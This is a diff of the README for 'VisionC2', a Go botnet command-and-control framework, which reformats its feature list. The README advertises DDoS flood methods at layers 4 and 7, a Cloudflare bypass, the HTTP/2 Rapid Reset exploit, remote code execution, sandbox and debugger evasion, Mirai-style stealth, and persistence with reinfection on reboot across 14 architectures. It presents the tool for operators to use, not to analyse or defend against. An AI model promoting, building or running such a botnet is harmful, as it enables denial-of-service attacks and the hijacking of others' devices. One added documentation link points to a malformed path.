@@ -3,7 +3,7 @@
 
 # ☾℣☽ VisionC2
 
- > Vision is a Go-based C2 (TUI) and Agent with HMAC Auth, TLS 1.3 Comms, Layer 4/7 Attacks , Remote Shell, Reverse SOCKS5, and Advance Anti-Anaylsis and Obfuscation Techniques server over a Go TUI
+ > An advanced command and control framework featuring DDOS, RCE, and SOCKS5 modules. It offers multi-layer encryption, TLS 1.3 communication, and supports 14+ CPU architectures. The system includes a user-friendly setup wizard that handles encryption, certificates, and code updates. With robust performance capabilities, secure communication protocols, and comprehensive bot management features.
 > 
 ![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge&logo=go)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge&logo=linux&logoColor=white)
@@ -19,42 +19,48 @@
 </div>
 
 
-##  Key Features
+## Key Features
 
-| Category              | Feature                                                                 |
-|-----------------------|-------------------------------------------------------------------------|
-|  CNC                 | Full-featured interactive TUI control panel (BubbleTea)                             |
-|  Communication      | Modern TLS 1.3 encrypted bot ↔ server communication                    |
-|  Attack Methods      | Layer 4 (network) & Layer 7 (application) attack methods                |
-|  Evasion            | Strong anti-analysis & sandbox evasion (HMAC/MD5 Auth, Proc Scan, Debugger Check)                                |
-|  Stealth            | Full Unix daemonization + single-instance enforcement (Mirai Style)                 |
-|  Persistent          | Automatic Cronjobs, startup service scripts, reinfect on device reboot             |
-|  C2 Resilience      | Supports TXT Records, A Records, Direct IP. (No Plaintext/Bot Decrypts C2 at runtime)    |
-|  Cross-Platform     | Multi-architecture bot binaries (14 targets out-of-the-box/ Custom UPX Packer included)             |
-|  Auto-Setup         | Interactive Python Script to automate Config Setup and Build (updates source code)              |
+**CNC** — Full-featured interactive TUI control panel built with BubbleTea.
 
-##  Attack Methods
+**Communication** — Modern TLS 1.3 encrypted bot-to-server communication.
 
-### Layer 4 (Network / Transport Layer)
+**Attack Methods** — Layer 4 (network) and Layer 7 (application) attack methods.
 
-| Method       | Protocol       | Description                                          |
-|--------------|----------------|------------------------------------------------------|
-| UDP Flood    | UDP            | High-volume 1024-byte payload spam                   |
-| TCP Flood    | TCP            | Connection table exhaustion attack                   |
-| SYN Flood    | Raw TCP        | SYN packets with randomized source ports             |
-| ACK Flood    | Raw TCP        | ACK packet flooding                                  |
-| GRE Flood    | GRE (47)       | GRE protocol packets with maximum payload            |
-| DNS Flood    | UDP / DNS      | Randomized DNS query types (A, AAAA, MX, NS, etc.)   |
+**Evasion** — Anti-analysis and sandbox evasion including HMAC/MD5 auth, process scanning, and debugger detection.
 
-### Layer 7 (Application Layer)
-| Method          | Description                                                  |
-|-----------------|--------------------------------------------------------------|
-| HTTP Flood      | GET/POST requests with randomized headers & user-agents      |
-| HTTPS/TLS Flood | TLS handshake exhaustion + burst of full requests            |
-| CF Bypass       | Cloudflare bypass via session/cookie reuse & fingerprinting  |
-| Rapid Reset     | HTTP/2 CVE-2023-44487 — batched HEADERS+RST_STREAM framing  |
-| Proxy Support   | Full proxy list integration for all L7 methods (HTTP/SOCKS5) |
+**Stealth** — Full Unix daemonization with single-instance enforcement (Mirai-style).
 
+**Persistence** — Automatic cronjobs, startup service scripts, and reinfection on device reboot.
+
+**C2 Resilience** — Supports TXT records, A records, and direct IP. No plaintext — the bot decrypts C2 addresses at runtime.
+
+**Cross-Platform** — Multi-architecture bot binaries with 14 targets out of the box. Custom UPX packer included.
+
+**Auto-Setup** — Interactive Python script to automate config setup and build, updating source code directly.
+
+---
+
+## Attack Methods
+
+### Layer 4 (Network / Transport)
+
+- **UDP Flood** — High-volume 1024-byte payload spam over UDP.
+- **TCP Flood** — Connection table exhaustion over TCP.
+- **SYN Flood** — SYN packets with randomized source ports (raw TCP).
+- **ACK Flood** — ACK packet flooding (raw TCP).
+- **GRE Flood** — GRE protocol (47) packets with maximum payload.
+- **DNS Flood** — Randomized DNS query types (A, AAAA, MX, NS, etc.) over UDP.
+
+### Layer 7 (Application)
+
+- **HTTP Flood** — GET/POST requests with randomized headers and user-agents.
+- **HTTPS/TLS Flood** — TLS handshake exhaustion combined with burst requests.
+- **CF Bypass** — Cloudflare bypass via session/cookie reuse and fingerprinting.
+- **Rapid Reset** — HTTP/2 exploit (CVE-2023-44487) using batched HEADERS + RST_STREAM framing.
+- **Proxy Support** — Full proxy list integration for all L7 methods (HTTP and SOCKS5).
+
+---
 
 ##  Installation
 
@@ -139,9 +145,12 @@ Bot Binary
 ```
 
 ##  Documentation
+
+- **Full Docs**: [`Docs/USAGE.md`](Docs/ARCHITECTURE.md.md)
 - **Changelog**: [`Docs/CHANGELOG.md`](Docs/CHANGELOG.md)
 - **Commands**: [`Docs/COMMANDS.md`](Docs/COMMANDS.md)
 - **Usage**: [`Docs/USAGE.md`](Docs/USAGE.md)
+
 
 ## Legal Disclaimer
 
